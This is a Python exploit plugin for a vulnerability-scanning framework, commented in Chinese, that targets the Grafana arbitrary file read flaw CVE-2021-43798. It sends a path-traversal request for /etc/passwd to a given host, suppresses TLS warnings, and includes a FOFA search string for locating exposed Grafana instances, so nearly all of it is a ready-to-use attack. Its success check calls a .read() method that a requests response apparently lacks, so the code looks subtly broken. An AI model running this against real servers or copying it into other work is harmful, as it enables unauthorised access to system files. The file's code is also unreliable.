import pocs
from lib import config
import re
import requests
import urllib3
from colorama import init
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=False) 

# 定义类 名称不可改变，且需要继承父类Pocs
class POC(pocs.Pocs):

    def __init__(self):
        '''
            初始化函数
        '''
        # 根据漏洞的信息进行定义
        super().__init__()
        self.poc_name='Grafana任意文件读取漏洞'
        self.vul_name='Grafana任意文件读取漏洞'
        self.vul_num='CVE-2021-43798'
        self.app_name='Grafana'
        self.app_version='8.x'
        self.author='haochen'
        self.msg='fofa查询：app="Grafana'
        # 根据需要的参数进行定义，被攻击的url或ip必须定义为target
        self.must_parameter={
            'target' : ''
        }

    def exploit(self,must_parameter,cho_parameter):
        '''
            扫描使用的函数
        '''
        # 自由发挥
        att_msg={}
        # 将攻击的目标和poc名称导入
        url = must_parameter['target']
        att_msg['target']=url
        att_msg['pocname'] = self.poc_name
        self.must_parameter = must_parameter
        head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'}
        self.payload = "/public/plugins/prometheus/../../../../../../../../../etc/passwd"
        if re.search('/$',url):
            url=url[0:len(url)-1]
        target = url + self.payload
        try:
            response = requests.get(target,headers=head)
            # 攻击完成后需要将攻击的结果写入
            if 'root' in response.read().decode("utf-8"):
                att_msg['status'] = 'success'
                att_msg['msg'] = '存在漏洞'
            else:
                att_msg['status']='failed'
                att_msg['msg']='不存在漏洞，网站返回值为: '+str(response.status_code) 
                #self.set_cout('failed','不存在漏洞，网站返回值为: '+str(response.status_code) )
        except:
            att_msg['status']='error'
            att_msg['msg']='无法正确访问网站'
            #self.set_cout('error','无法正确访问网站！')
        # 返回攻击结果信息
        return att_msg